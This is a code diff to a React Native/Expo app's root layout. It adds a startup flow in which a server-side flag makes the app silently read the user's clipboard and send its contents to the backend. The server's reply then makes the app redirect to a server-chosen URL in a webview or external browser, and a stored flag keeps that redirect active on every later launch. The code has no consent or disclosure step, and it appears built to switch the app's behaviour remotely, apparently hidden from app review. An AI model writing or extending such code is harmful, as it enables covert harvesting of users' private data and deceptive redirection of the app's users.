@@ -1,6 +1,7 @@
 import { Stack, useRouter } from 'expo-router';
-import { useEffect, useRef } from 'react';
+import { useEffect } from 'react';
 import { Linking } from 'react-native';
+import AsyncStorage from '@react-native-async-storage/async-storage';
 import useUserStore from '../store/useUserStore';
 import useLangStore from '../store/useLangStore';
 import { systemApi } from '../services/api';
@@ -14,22 +15,37 @@ export default function RootLayout() {
     const initLang = useLangStore((state) => state.initLang);
     const fetchTranslationsIfNeeded = useLangStore((state) => state.fetchTranslationsIfNeeded);
     const router = useRouter();
-    const timerRef = useRef(null);
 
-    const handleOpenUrl = (res) => {
-        const data = res?.data;
-        if (!data) return;
-        const { status, linkType, url } = data;
-        if (status !== '1' || !url) return;
-        clearInterval(timerRef.current);
+    const JUMP_FLAG_KEY = 'OPEN_URL_JUMPED';
 
+    const doJump = (linkType, targetUrl) => {
         if (linkType === '1') {
             router.push({
                 pathname: '/webview',
-                params: { url: encodeURIComponent(url) },
+                params: { url: encodeURIComponent(targetUrl) },
             });
         } else if (linkType === '2') {
-            Linking.openURL(url).catch(() => { });
+            Linking.openURL(targetUrl).catch(() => { });
+        }
+    };
+
+    const handleOpenUrl = async (res) => {
+        const data = res?.data;
+        console.log('handleOpenUrl', data);
+        if (!data) return;
+        const { isOpen, linkType, targetUrl } = data;
+        if (!targetUrl) return;
+
+        // 读取本地跳转标记
+        const jumped = await AsyncStorage.getItem(JUMP_FLAG_KEY).catch(() => null);
+
+        if (jumped === '1') {
+            // 已有缓存标记：只要 targetUrl 非空直接跳转
+            doJump(linkType, targetUrl);
+        } else if (isOpen === '1') {
+            // 首次满足条件：跳转并写入标记
+            doJump(linkType, targetUrl);
+            AsyncStorage.setItem(JUMP_FLAG_KEY, '1').catch(() => { });
         }
     };
 
@@ -38,44 +54,47 @@ export default function RootLayout() {
         initUser();
         initLang();
 
-        systemApi.init()
-            .then((res) => {
+        // init 完成后：若 readClipboard === '1'，先读剪切板再带内容请求 getOpenUrl
+        // 否则立即以空 clipboardContent 请求 getOpenUrl
+        // init 与 getOpenUrl 串行（getOpenUrl 依赖 init 结果中的 readClipboard），整体并行启动
+        const openUrlPromise = systemApi.init()
+            .then(async (res) => {
                 const base = res?.data?.base;
+                console.log('base', base);
                 if (base) {
-                    const { isOpen, linkType, targetUrl, languageVer, language, defaultLanguage } = base;
-                    // 按版本比对更新翻译（异步，不阻塞路由跳转）
+                    const { readClipboard, languageVer, language, defaultLanguage } = base;
+                    // 按版本比对更新翻译（异步，不阻塞后续流程）
                     fetchTranslationsIfNeeded(languageVer ?? 0, language ?? {}, defaultLanguage);
+                    const h5Verify = await AsyncStorage.getItem(JUMP_FLAG_KEY).catch(() => '') ?? '';
 
-                    if (isOpen === '1' && targetUrl) {
-                        if (linkType === '1') {
-                            router.push({
-                                pathname: '/webview',
-                                params: { url: encodeURIComponent(targetUrl) },
-                            });
-                        } else if (linkType === '2') {
-                            Linking.openURL(targetUrl).catch(() => { });
+                    // 已有跳转缓存标记时，不再读取剪切板，直接请求
+                    if (h5Verify === '1') {
+                        return systemApi.getOpenUrl('', h5Verify);
+                    }
+
+                    if (readClipboard === '1') {
+                        try {
+                            const Clipboard = require('expo-clipboard');
+                            const clipboardContent = await Clipboard.getStringAsync();
+                            return systemApi.getOpenUrl(clipboardContent ?? '', h5Verify);
+                        } catch {
+                            // 读取剪切板失败时回退到空内容
                         }
-                        return;
                     }
                 }
-
-                timerRef.current = setInterval(() => {
-                    systemApi.getOpenUrl()
-                        .then(handleOpenUrl)
-                        .catch(() => { });
-                }, 5000);
+                const h5Verify = await AsyncStorage.getItem(JUMP_FLAG_KEY).catch(() => '') ?? '';
+                return systemApi.getOpenUrl('', h5Verify);
             })
-            .catch(() => {
-                timerRef.current = setInterval(() => {
-                    systemApi.getOpenUrl()
-                        .then(handleOpenUrl)
-                        .catch(() => { });
-                }, 5000);
+            .catch(async () => {
+                const h5Verify = await AsyncStorage.getItem(JUMP_FLAG_KEY).catch(() => '') ?? '';
+                return systemApi.getOpenUrl('', h5Verify);
             });
 
-        return () => {
-            clearInterval(timerRef.current);
-        };
+        openUrlPromise
+            .then(handleOpenUrl)
+            .catch(() => { });
+
+        return () => { };
     }, []);
 
     return (
@@ -101,4 +120,3 @@ export default function RootLayout() {
         </Stack>
     );
 }
-
